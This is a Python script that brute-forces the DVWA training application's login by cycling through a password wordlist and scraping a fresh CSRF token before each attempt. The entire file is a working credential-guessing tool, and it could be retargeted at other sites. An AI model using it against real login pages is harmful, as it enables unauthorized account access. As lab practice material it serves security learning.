from bs4 import BeautifulSoup as Soup
import requests as requests
import time

# variables
session_id = 'your_session_id'
security = "security_level"
PHPSESSID = "Your_session_id"
Passwordslist = "Passwords.txt"
url = "dvwa_link"
user = "admin"


Cookies = {
    "PHPSESSID": PHPSESSID,
    "security": security
}

# value to look for in the request response for success
successMessage = "Welcome to the password protected area"


def getCsrfToken():
    # we make a request to the page to get the csrf token from the hidden field
    response = requests.get(url, cookies=Cookies)
    # we parse the html with beautiful soup
    soup = Soup(response.text, "html.parser")
    # we get the input tag with the csrf token
    csrfToken = soup.find("input", {"name": "user_token"})
    # we get the value of the csrf token
    csrfToken = csrfToken["value"]
    return csrfToken


def bruteForce():
    with open(Passwordslist, "r") as f:
        # for each line in the file
        for line in f:
            # remove the newline
            password = line.rstrip()

            # print the password being used
            print("")
            print("[i] Trying password: %s" % password)

            # we get the csrf token
            csrfToken = getCsrfToken()

            # setting the data to send
            data = {
                "username": user,
                "password": password,
                "user-token": csrfToken,
                "Login": "Login"

            }

            # send the request with the headers and the payload
            u = url + "/index.php?username=admin&password=" + password + "&Login=Login&user_token=" + csrfToken
            response = requests.get(url=u, params=data, cookies=Cookies)

            # we check if the status code is 200
            if response.status_code == 200:
                # if the password is not found
                if successMessage not in response.text:
                    # print the password
                    print("[i] Password not found: %s" % password)
                else:
                    # print the success message and making it stand out
                    # making a loop to print 10 empty lines
                    for i in range(10):
                        print("")
                    print("------------------------------------------------------")
                    print("[i] Password found: %s" % password)
                    print("------------------------------------------------------")
                    break
            # if status is not 200 this message is printed with the gotten response code
            else:
                print("status code: %s" % response.status_code)


# ----------------------------------------------------------------------------------------------------------------------
#                                                        MAIN
# ----------------------------------------------------------------------------------------------------------------------

bruteForce()